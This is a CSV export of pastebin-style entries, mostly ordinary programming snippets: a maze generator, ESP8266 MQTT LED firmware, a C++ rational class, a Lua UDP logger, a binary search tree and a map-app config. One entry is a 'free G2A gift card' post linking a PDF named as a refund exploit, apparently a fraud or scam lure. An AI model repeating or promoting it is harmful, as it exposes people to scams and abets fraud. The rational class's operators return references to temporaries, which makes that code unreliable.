id,title,username,language,date,content
36MC494n,data852,TestGuy1,JSON,Monday 26th of February 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'bbcec1023f2160e68b7cbd656b40e8b44e0d8fc77b1309f3fe6e224011d8800567fb5ce89371b4fac72d67eed5b928445e18f52fdc1c1989e5a43f328dc9d274bfd16359b97837fbc8cff70bae7a31b90ed2e768f5ab4768964c093c4e956f08b668e5ee14b25221cb7a50b65f4c9767ffaa82a073f0fcbad726019fe7c810ab',
  otherdata: [
    'c6cce992737f4d5ca71d71d2138a9c66',
    '2f9fc7db4577b445c2d56093d18465d5',
    'a84a345bbe774b58a3a884cedbd5e3f4',
    '30c6408203306be4a91a9bb4fbed53bd',
    '56f6f389f5be5912dc80ae32d688290b',
    '5ba8dab44f2b429f36fd5be00c69e67a',
    'eb6ec83ceecad525d7d17d806d4c84e0',
    'ab13eb4ac24d89236e6d547f7f99e98e'
  ]
}"
S064z1xc,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Monday 26th of February 2024 05:43:06 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_224072.pdf

Working as of:
26 February 2024"
GK1VDyR7,njbowj brohb o owr,milk_cool,Python,Monday 26th of February 2024 05:41:40 AM CDT,"# https://habr.com/ru/articles/176671/

import random

size = int(input(""Maze size: ""))
seed = input(""Enter random seed: "")
if seed != """":
	random.seed(seed)

class Cell:
	def __init__(self, group = 0, bottom = False, right = False):
		self.bottom = bottom
		self.right = right
		self.group = group
		self.erased = False

maze = []
row = 0
last = 0 # Last set no.

def inc_last():
	global last
	ret = last
	last += 1
	return ret
def yn():
	return random.choice([True, False])

for __ in range(size):
	if row == 0:
		maze += [[Cell(inc_last()) for _ in range(size)]]
	else:
		maze += [maze[-1]]
		for i in range(size):
			maze[-1][i].right = False
			if maze[-1][i].bottom:
				maze[-1][i].erased = True
	for i in range(size):
		if maze[-1][i].erased:
			maze[-1][i].group = inc_last()
			maze[-1][i].erased = False
	for i in range(size - 1):
		if(maze[-1][i].group == maze[-1][i + 1].group or yn()):
			maze[-1][i].right = True
			maze[-1][i + 1].group = maze[-1][i].group
	for i in range(size):
		start = i
		end = i
		while maze[-1][end].group == maze[-1][start].group:
			end += 1
			if end == size:
				break
		n = random.randint(0, end - start - 1)
		indexes = list(range(start, end))
		for _ in range(n):
			indind = random.randint(0, len(indexes) - 1)
			ind = indexes[indind]
			maze[-1][ind].bottom = True
			indexes = indexes[:indind] + indexes[indind + 1:]

print(""_"" * (2 * size + 1))
for x in range(len(maze)):
	for y in range(len(maze[x])):
		if y == 0:
			print(""|"", end="""")
		print(""_"" if maze[x][y].bottom or x == size - 1 else "" "", end="""")
		print(""|"" if maze[x][y].right or y == size - 1 else "" "", end="""")
	print()	
print(""‾"" * (2 * size + 1))"
aLvLvU0Y,main.cpp,Chewpacker,C++,Monday 26th of February 2024 05:35:44 AM CDT,"#include <ESP8266WiFi.h>
#include <AbstractTask.h>
#include <Scheduler.h>
#include <Task.h>
#include <PubSubClient.h>
#include ""helpers/wifihelper.h""
#include <Arduino.h>
#include <Arduino_JSON.h>
#include <string>
#include <stdexcept>
#include <iostream>
#include <FastLED.h>

#define DATA_PIN D2
#define NUM_LEDS 60

CRGB leds[NUM_LEDS];

const unsigned long LED_UPDATE_INTERVAL = 5000;

const char *mqtt_server = """";
  const int mqtt_port = ;
  const char *mqtt_user = """";
  const char *mqtt_password = """";
  const char *mqtt_requesttopic = ""garmin/requestStats"";
  const char *mqtt_responsetopic = ""garmin/responseStats"";
  String responseMessage;
  JSONVar jsonMessage;

WiFiClient espClient;
PubSubClient client(espClient);

class Steps
{
public:
  int StepGoal;
  int TotalSteps;
  float CalculatePercentage()
  {
    if (StepGoal != 0)
    {
      return static_cast<float>(TotalSteps) / static_cast<float>(StepGoal) * 100.0f;
    }
    else
    {
      Serial.println(""Error: Division by zero."");
      return -1.0f;
    }
  };
  Steps(int stepGoal = 0, int totalSteps = 0)
  {
    StepGoal = stepGoal;
    totalSteps = totalSteps;
  };
};
Steps steps(0, 0);

class StateObject {
  public:
    int AverageStress;
    int BodyBatteryLatest;
    int SleepScore;
    float RestStressPercentage;
    Steps StepsObject;
    bool StatsMode;
    unsigned long LastUpdateTime;
    int LastPercentage;
    CRGB LastColour;
    StateObject()
    {
      AverageStress = 0;
      BodyBatteryLatest = 0;
      SleepScore = 0;
      RestStressPercentage = 0;
      StepsObject = Steps(1, 0);
      StatsMode = false;
      LastUpdateTime = 0;
      LastPercentage = 0;
      LastColour = CRGB::Black;
    };
};
StateObject stateObject;

class FastLedHelper
{
public:
  void initializeLEDs()
  {
    FastLED.addLeds<WS2812B, DATA_PIN, GRB>(leds, NUM_LEDS);
  }

  void updateLEDs(int percentage, CRGB colour, unsigned long &lastUpdateTime)
  {
    int ledsToLight = map(percentage, 0, 100, 0, NUM_LEDS);

    fill_solid(leds, NUM_LEDS, colour.Black);
    FastLED.show();
    delay(100);

    for (int i = NUM_LEDS - 1; i > NUM_LEDS - ledsToLight; i--)
    {
      leds[i] = colour;
      FastLED.show();
      delay(75);
    }
  }

  void ambientDisplay()
  {
    Serial.println(""Starting Ambient Display"");
    fill_solid(leds, NUM_LEDS, CRGB::Black);
    FastLED.show();

    for (int i = NUM_LEDS - 1; i >= 0; i--)
    {
      leds[i] = CRGB::Red;
      FastLED.show();
      delay(75);
    }
  }

  void displayStats(int percentage, CRGB colour)
  {
    if (percentage != stateObject.LastPercentage || colour != stateObject.LastColour)
    {
      updateLEDs(percentage, colour, stateObject.LastUpdateTime);
    }
  }
} fastLedHelper;

class MqttHelper
{
public:
  static void MapStateMessageToStateObject(JSONVar message)
  {
    if (message.hasOwnProperty(""average_stress"") &&
        message.hasOwnProperty(""body_battery_latest"") &&
        message.hasOwnProperty(""sleep_score"") &&
        message.hasOwnProperty(""rest_stress_percentage"") &&
        message.hasOwnProperty(""step_goal"") &&
        message.hasOwnProperty(""total_steps""))
    {

      stateObject.AverageStress = message[""average_stress""];
      stateObject.BodyBatteryLatest = message[""body_battery_latest""];
      stateObject.SleepScore = message[""sleep_score""];
      stateObject.RestStressPercentage = (double)message[""rest_stress_percentage""];
      stateObject.StepsObject.StepGoal = message[""step_goal""];
      stateObject.StepsObject.TotalSteps = message[""total_steps""];
      stateObject.StatsMode = message[""stats_mode""];
    }
    else
    {
      char newMessage[] = ""Failed to map state message to state object, one or more parameters are missing"";
      Serial.println(newMessage);
      throw std::invalid_argument(std::string(newMessage));
    }
  }

static void callback(char* topic, byte* payload, unsigned int length) {
    for (unsigned int i = 0; i < length; i++) {
        responseMessage += (char)payload[i];
    }

    Serial.println(responseMessage);

      responseMessage.replace(""False"", ""false"");
      responseMessage.replace(""True"", ""true"");

    jsonMessage = JSON.parse(responseMessage);

    MqttHelper::MapStateMessageToStateObject(jsonMessage);

    responseMessage = """";
    jsonMessage = null;
}

static void requestStats() {
    client.publish(mqtt_requesttopic, """");
}

  void setupMQTT()
  {
    client.setServer(mqtt_server, mqtt_port);
    client.setCallback(&callback);

    while (!client.connected())
    {
      Serial.print(""Connecting to MQTT..."");
      if (client.connect(""ESP8266Client"", mqtt_user, mqtt_password))
      {
        Serial.println(""connected to MQTT, subscribed to "");
        Serial.println(mqtt_responsetopic);
        client.subscribe(mqtt_responsetopic);
      }
      else
      {
        Serial.print(""failed, rc="");
        Serial.print(client.state());
        Serial.println("" try again in 5 seconds"");
        delay(5000);
      }
    }
  }
} mqttHelper;

class FastLedTask : public Task
{
protected:
  void loop()
  {
    if (!stateObject.StatsMode)
    {
      fastLedHelper.ambientDisplay();
      MqttHelper::requestStats();
      delay(1000);
    }
    else
    {
      fastLedHelper.displayStats(stateObject.AverageStress, CRGB::Red);
      MqttHelper::requestStats();
      delay(10000);
      if (stateObject.StatsMode)
      {
        fastLedHelper.displayStats(stateObject.BodyBatteryLatest, CRGB::Blue);
      MqttHelper::requestStats();
      delay(10000);
      }
      if (stateObject.StatsMode)
      {
        fastLedHelper.displayStats(stateObject.SleepScore, CRGB::Orange);
      MqttHelper::requestStats();
      delay(10000);
      }
      if (stateObject.StatsMode)
      {
        fastLedHelper.displayStats(stateObject.RestStressPercentage, CRGB::Purple);
      MqttHelper::requestStats();
      delay(10000);
      }
      if (stateObject.StatsMode)
      {
        fastLedHelper.displayStats(stateObject.StepsObject.CalculatePercentage(), CRGB::Green);
      MqttHelper::requestStats();
      delay(10000);
      }
    }
  }

private:
  time_t lastCheck;
  bool firstRun;
} fastLedTask;

class MqttTask : public Task
{
protected:
  void loop()
  {
    client.loop();
    delay(500);
  }

private:
  time_t lastCheck;
  bool firstRun;

} mqttTask;

void setup()
{
  Serial.begin(115200);

  setupWiFi();

  fastLedHelper.initializeLEDs();
  mqttHelper.setupMQTT();

  Scheduler.start(&mqttTask);
  Scheduler.start(&fastLedTask);

  Scheduler.begin();
}

void loop()
{
}
"
s0BvtQTH,Untitled,35657,C++,Monday 26th of February 2024 05:28:39 AM CDT,"#include <iostream>

using namespace std;

class rational {

public:

    rational(int numerator, int denominator) {
        numerator_ = numerator;
        denominator_ = denominator;
        reduction();
    }

    int numerator() const {
        return numerator_;
    }

    int denominator() const {
        return denominator_;
    }

    rational& operator+=(const rational& other) {
        numerator_ = numerator_ * other.denominator_ + other.numerator_ * denominator_;
        denominator_ = denominator_ * other.denominator_;
        reduction();
        return *this;
    } // переопределение оператора +=

    rational& operator-=(const rational& other) {
        numerator_ = numerator_ * other.denominator_ - other.numerator_ * denominator_;
        denominator_ = denominator_ * other.denominator_;
        reduction();
        return *this;
    } // переопределение оператора -=

    rational& operator*=(const rational& other) {
        numerator_ *= other.numerator_;
        denominator_ *= other.denominator_;
        reduction();
        return *this;
    } // переопределение оператора *=

    rational& operator/=(const rational& other) {
        numerator_ *= other.denominator_;
        denominator_ *= other.numerator_;
        reduction();
        return *this;
    } // переопределение оператора /=

private:
    int numerator_;
    int denominator_;

    void reduction() { // сокращение дроби

        if (denominator_ < 0) {
            numerator_ *= -1;
            denominator_ *= -1;
        }

        int x = numerator_ < 0 ? -numerator_ : numerator_;
        int y = denominator_;

        while (x != y) {
            if (x > y) {
                x -= y;
            }
            else {
                y -= x;
            }
        }
        numerator_ /= x;
        denominator_ /= x;
    }
};

rational& operator+(const rational& left, const rational& right) {
    rational temp = left;
    return temp += right;
} // переопределение оператора + с помощью ранее переопределенного оператора +=

rational& operator-(const rational& left, const rational& right) {
    rational temp = left;
    return temp -= right;
} // переопределение оператора - с помощью ранее переопределенного оператора -=

rational& operator*(const rational& left, const rational& right) {
    rational temp = left;
    return temp *= right;
} // переопределение оператора * с помощью ранее переопределенного оператора *=

rational& operator/(const rational& left, const rational& right) {
    rational temp = left;
    return temp /= right;
} // переопределение оператора / с помощью ранее переопределенного оператора /=

bool operator==(const rational& left, const rational& right) {
    return left.numerator() == right.numerator() && left.denominator() == right.denominator();
} // перегрузка оператора ==

bool operator!=(const rational& left, const rational& right) {
    return !(left == right);
} // перегрузка оператора != с помощью ранее переопределенного ==

bool operator>(const rational& left, const rational& right) {
    return left.numerator() * right.denominator() > right.numerator() * left.denominator();
}

bool operator<(const rational& left, const rational& right) {
    return left.numerator() * right.denominator() < right.numerator() * left.denominator();
}

bool operator>=(const rational& left, const rational& right) {
    return left.numerator() * right.denominator() >= right.numerator() * left.denominator();
}

bool operator<=(const rational& left, const rational& right) {
    return left.numerator() * right.denominator() <= right.numerator() * left.denominator();
}

ostream& operator<<(ostream& output, const rational& right) {
     return output << right.numerator() << '/' << right.denominator();
}

istream& operator>>(istream& input, rational& right) {
    int numerator;
    int denominator;
    char slash;
    if ((input >> numerator) && (input >> slash) && (slash == '/') && (input >> denominator)) {
        right = rational{ numerator, denominator };
    }
    return input;
}


int main() {

    setlocale(LC_ALL, ""ru"");

    rational r1(1, 2);
    rational r2(3, 4);
    cout << r1 << endl;
    cout << r2 << endl;

    cout << (r1 == r2) << endl;
    cout << (r1 != r2) << endl;
    cout << (r1 > r2) << endl;
    cout << (r1 < r2) << endl;
    cout << (r1 >= r2) << endl;
    cout << (r1 <= r2) << endl;

    r1 += r2;
    cout << r1 << endl;

    r1 -= r2;
    cout << r1 << endl;

    r1 *= r2;
    cout << r1 << endl;

    r1 /= r2;
    cout << r1 << endl;

    int a = 3;
    int b = 2;

    rational r3(1, 1);
    r3 = r1 + r2;
    cout << r3 << endl;

    r3 = r1 - r2;
    cout << r3 << endl;

    r3 = r1 * r2;
    cout << r3 << endl;

    r3 = r1 / r2;
    cout << r3 << endl;

    cin >> r3;
    cout << r3 << endl;
}

"
PGXVja3Z,udprint,Snusmumriken,Lua,Monday 26th of February 2024 05:14:27 AM CDT,"local socket = require'socket'

local function gettime()
	local time = socket.gettime()
	local msec = time - math.floor(time)
	local date = os.date(""%d.%m.%y-%X"", time)
	return (""%-21s""):format(date .. ""."" .. math.floor(msec * 300))
end

local function server(host, port)
	host = host or ""*""
	port = port or 4096
	local udp = (socket.udp4 or socket.udp)()
	assert(udp:setsockname(host, port))
	--udp:listen()
	
	return function()
		local msg, host, port = udp:receivefrom()
		print(gettime() .. "" "" .. host .. "":"" .. port .. "" > "" .. msg)
	end, udp:getsockname()
end

local function client(host, port)
	host = host or ""127.0.0.1""
	port = port or 4096
	local udp = (socket.udp4 or socket.udp)()
	
	return function(...)
		local msg = """"
		for i = 1, select(""#"", ...) do
			msg = msg .. ""\t"" .. tostring(select(i, ...))
		end
		udp:sendto(msg, host, port)
	end
end

if ... then
	return {
		server = server,
		client = client
	}
end

local server, host, port = server()
host = socket.dns.toip("""")
print(""Listen "", host, port)

while 1 do
	server()
end

-- print = require'udprint'.client(""host_ip"")"
CjDbqskp,Bst.c,Aravind_reddy10,C,Monday 26th of February 2024 05:05:10 AM CDT,"#include <stdio.h>
#include <stdlib.h>
struct TreeNode
{
	int data;
	struct TreeNode *left;
	struct TreeNode *right;
};
typedef struct TreeNode node;
node *insert(node *root,int val)
{
	if(root==NULL)
	{
		node *newNode=(node*)malloc(sizeof(node));
		newNode->data=val;
		newNode->left=NULL;
		newNode->right=NULL;
		return newNode;
	}
	if(val<root->data)
	{
		root->left=insert(root->left,val);
	}
	else if(val>root->data)
	{
		root->right=insert(root->right,val);
	}
	return root;
}
void display(node *root)
{
	if(root!=NULL)
	{
		display(root->left);
		printf(""%d->"",root->data);
		display(root->right);
	}
}
int count_leafs(node *root)
{
	int ans;
	if(root==NULL)
	{
		return 0;
	}
	else if(root->left==NULL&&root->right==NULL)
	{
		return 1;
	}
	else
	{
		ans=count_leafs(root->left)+count_leafs(root->right);
	}
	return ans;
}
int sum_leafs(node *root)
{
	int sum;
	if(root==NULL)
	{
		return 0;
	}
	else if(root->left==NULL&&root->right==NULL)
	{
		return root->data;
	}
	else
	{
		sum=sum_leafs(root->left)+sum_leafs(root->right);
	}
	return sum;
}
int search(node *root,int search1)
{
	if(root==NULL)
	{
		return 0;
	}
	else
	{
		while(root->data!=search1)
		{
			if(root!=NULL)
			{
				printf(""%d->"",root->data);
				if(search1>root->data)
				{
					root=root->right;
				}
				else
				{
					root=root->left;
				}
			}
			if(root==NULL)
			{
				return 0;
			}
		}
	}
	return 1;
}
int main()
{
	int n,i,val;
	printf(""Enter size of tree:"");
	scanf(""%d"",&n);
	node *root=NULL;
	printf(""\nEnter nodes:"");
	for(i=0;i<n;i++)
	{
		scanf(""%d"",&val);
		root=insert(root,val);
	}
	printf(""INORDER is:"");
	display(root);
	int count=count_leafs(root);
	printf(""\nThe total leafs are : %d"",count);
	int sum=sum_leafs(root);
	printf(""\nThe sum of leaf odes is : %d"",sum);
	int search_val;
	printf(""\nEnter search value:"");
	scanf(""%d"",&search_val);
	int ans=search(root,search_val);
	if(ans==1)
	{
		printf(""\nValue is found"");
	}
	else
	{
		printf(""\nValue is not found"");
	}
	return 0;
}
"
71GugJhN,test case,LEGEND2004,C++,Monday 26th of February 2024 04:51:04 AM CDT,"#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long
#define fastio ios_base::sync_with_stdio(0); cin.tie(0)

signed main()
{
    fastio;
    
    // eger meselelerde test case ile giris daxil olunsa
    // her test case ucun meseleni hell edib;
    // while dovrunun icerisinde yaziriq
    // iki ededin cemi, amma test caseler olarsa
    int t;
    cin >> t; // test case sayi
    while(t--){ // t defe
        int a , b;
        cin >> a >> b; // her test casede 2 eded daxil edirik
        cout << a + b << '\n'; // ve onlarin cemini veririk
        // alt setire dusmek vacibdi, cunki output fileda ededler alt alta yazilir
        // '\n' yazdiqda cixisi input bitdikden sonra hamsini birden verecek
        // endl yazsaq her cixisi test case daxil olunduqdan sonra verecek
    }
}"
yJU0b9K1,Regular function,Sherms,JavaScript,Monday 26th of February 2024 04:47:09 AM CDT,"// let person = new Person ('bob');

class Person {
    // let person = new Person ('bob');
    constructor(name) {
        this.name = name;
    }

    printNameFunction() {
        // let person = new Person ('bob');
        setTimeout(function() {
            // let person = new Person ('bob');
            console.log('Function:' + this.name);
        }, 100)

    }
}

let person = new Person ('bob');
person.printNameFunction();"
pb8GAEbP,Untitled,adellam,JavaScript,Monday 26th of February 2024 04:28:45 AM CDT,"                //===========================================================================================
                myApp.constants = {
                        PUBLIC_TOKEN: ""some application token"",
                        GEO_DATA: ""data/geodata.json"",
                        IMG_DATA: ""data/imgdata.json"",
                        AOI: ""MPA"",
                        OVERLAY_GROUP_NAMES: [{name: ""External layers""},{name: ""Target datasets""},{name: ""Marine Protected Areas""},{name: ""Base overlays""}],
                MAP_ZOOM: 3,
                        MAP_PROJECTION: 'EPSG:4326',
                        MAP_SELECTOR_DEFAULT: 'geoselector-default',
                        MAP_SELECTOR_CUSTOM: 'geoselector-custom',
            OGC_WMS_NS: ""W_mpa"",
            OGC_WMS_SUFFIX: ""geo_fea_"",
                        OGC_WMS_BASEURL: ""https://paim.d4science.org/geoserver/wms"",
                        OGC_WFS_BASEURL: ""https://paim.d4science.org/geoserver/wfs"",
                        OGC_WFS_FORMAT: new ol.format.GeoJSON(),
                        OGC_WFS_BBOX: null,
                        OGC_WFS_CACHE: ""paim_cache_db"",
            DATAMINER_BASEURL: ""https://dataminer.garr.d4science.org"",
                        DATAMINER_IDENTIFIER: ""org.gcube.dataanalysis.wps.statisticalmanager.synchserver.mappedclasses.transducerers.MPA_INTERSECT_V4_1"",
                        DATAMINER_OUTPUTDATA_HTTPS: true,
            OGC_CSW_BASEURL: ""https://geonetwork.d4science.org/geonetwork/srv/eng/csw"",
                        D4S_SOCIALNETWORKING_BASEURL: ""https://socialnetworking1.d4science.org/social-networking-library-ws/rest/2"",
                        D4S_HOMELIBRARY_BASEURL: ""https://workspace-repository.d4science.org/home-library-webapp/rest"",
                        WORKSPACE_USER_FOLDER: ""PAIM-reports"",
                        WORKSPACE_TEMP_FOLDER: ""temp"",
                        SURFACE_UNIT: {id: 'sqkm', label: 'km²'},
                        SURFACE_ROUND_DECIMALS: 2,
            DEBUG_REPORTING: false
                }

                if(!myApp.PAIM){
                        myApp.constants.DATAMINER_BASEURL = ""https://dataminer-prototypes.d4science.org"";
                }
"
